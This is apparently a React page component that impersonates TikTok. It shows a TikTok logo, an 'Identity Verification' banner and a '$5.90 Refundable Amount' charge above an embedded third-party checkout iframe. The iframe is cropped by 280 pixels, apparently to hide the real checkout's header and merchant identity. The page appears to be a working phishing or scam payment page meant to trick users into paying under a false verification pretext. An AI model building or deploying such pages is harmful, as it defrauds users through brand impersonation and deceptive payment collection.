import { useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import tiktokLogo from "@/assets/tiktok-logo.png";

const CHECKOUT_BASE_URL = "https://checkout.cooud.com/01KH52NHC02W9XP6SGHQ1DAMXK";

const TOP_CROP = 280;

const Index = () => {
  const [searchParams] = useSearchParams();
  const containerRef = useRef<HTMLDivElement>(null);

  const checkoutUrl = (() => {
    const params = searchParams.toString();
    return params ? `${CHECKOUT_BASE_URL}?${params}` : CHECKOUT_BASE_URL;
  })();

  return (
    <div
      ref={containerRef}
      style={{
        width: "100%",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        backgroundColor: "#f5f5f5",
      }}
    >
      {/* Header com logo e resumo */}
      <div
        style={{
          width: "100%",
          flexShrink: 0,
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          paddingTop: "28px",
          paddingBottom: "24px",
          backgroundColor: "#fff",
          borderBottom: "1px solid #eee",
        }}
      >
        <img
          src={tiktokLogo}
          alt="TikTok"
          style={{
            height: "32px",
            objectFit: "contain",
            marginBottom: "24px",
          }}
        />
        <div
          style={{
            width: "90%",
            maxWidth: "400px",
            backgroundColor: "#fafafa",
            borderRadius: "12px",
            padding: "20px 24px",
            border: "1px solid #f0f0f0",
          }}
        >
          <span
            style={{
              fontSize: "11px",
              fontWeight: 600,
              letterSpacing: "0.08em",
              color: "#6b7280",
              textTransform: "uppercase" as const,
            }}
          >
            Identity Verification
          </span>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: "12px",
              marginTop: "10px",
            }}
          >
            <span
              style={{
                fontSize: "28px",
                fontWeight: 700,
                color: "#111",
                letterSpacing: "-0.02em",
              }}
            >
              $5.90
            </span>
            <span
              style={{
                fontSize: "11px",
                fontWeight: 600,
                letterSpacing: "0.04em",
                color: "#10b981",
                backgroundColor: "#ecfdf5",
                padding: "4px 10px",
                borderRadius: "20px",
                textTransform: "uppercase" as const,
              }}
            >
              Refundable Amount
            </span>
          </div>
        </div>
      </div>

      {/* Iframe do checkout */}
      <div
        style={{
          position: "relative",
          flex: 1,
          overflow: "hidden",
        }}
      >
        <iframe
          src={checkoutUrl}
          title="Checkout"
          style={{
            position: "absolute",
            top: `-${TOP_CROP}px`,
            left: 0,
            width: "100%",
            height: `calc(100% + ${TOP_CROP}px)`,
            border: "none",
          }}
          allow="payment *; clipboard-write"
          sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation allow-popups-to-escape-sandbox"
        />
      </div>
    </div>
  );
};

export default Index;
